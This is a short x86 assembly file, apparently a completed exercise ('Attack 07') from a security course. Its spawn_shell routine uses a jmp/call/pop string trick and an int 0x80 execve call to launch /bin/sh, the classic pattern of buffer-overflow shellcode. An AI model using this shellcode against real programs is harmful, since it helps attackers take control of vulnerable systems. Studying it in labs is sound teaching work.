/*
 * Attack 07 - Assembly code to spawn a shell
 */
    .global main

    .text
main:
    # Main doesn't do much.
    # Just call spawn_shell.
    call  spawn_shell
    # Then, if by some accident we're still here, 
    # we return to the C runtime to exit the program.
    ret
spawn_shell:
    #
    # Your code goes here  
    #
    push  %ebp
    mov   %esp,%ebp
    sub   $0x28,%esp
    jmp   string
body:
    movl  $0xb,%eax
    pop   %ebx
    movl  %ebx,-0x10(%ebp)
    movl  $0x0,-0xc(%ebp)
    leal  -0x10(%ebp),%ecx
    leal  -0xc(%ebp),%edx
    int   $0x80
    movl  $0x1,%eax
    movl  $0x0, %ebx
    int   $0x80
string:
    call   body
    .string "/bin/sh"
    ret

